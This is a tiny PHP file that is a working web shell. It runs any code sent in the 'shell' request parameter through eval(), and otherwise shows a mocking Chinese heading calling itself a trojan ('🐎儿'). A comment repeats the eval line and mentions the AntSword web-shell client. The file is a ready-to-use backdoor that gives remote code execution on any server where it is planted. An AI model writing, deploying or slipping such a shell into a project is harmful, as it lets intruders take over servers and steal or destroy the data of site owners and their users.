<?php 

if(isset($_REQUEST['shell'])){
	@eval($_REQUEST['shell']);
}else{
	echo '<h1>嘿嘿，我的🐎儿，嘿嘿、嘿嘿</h1>
<!-- 
@eval($_REQUEST["shell"]);
你知道蚁剑吗
-->';
}
?>
<!DOCTYPE html>
<head>
	<meta charset="utf-8" />
	<title>🐎儿</title>
</head>
<body>
</body>
</html>
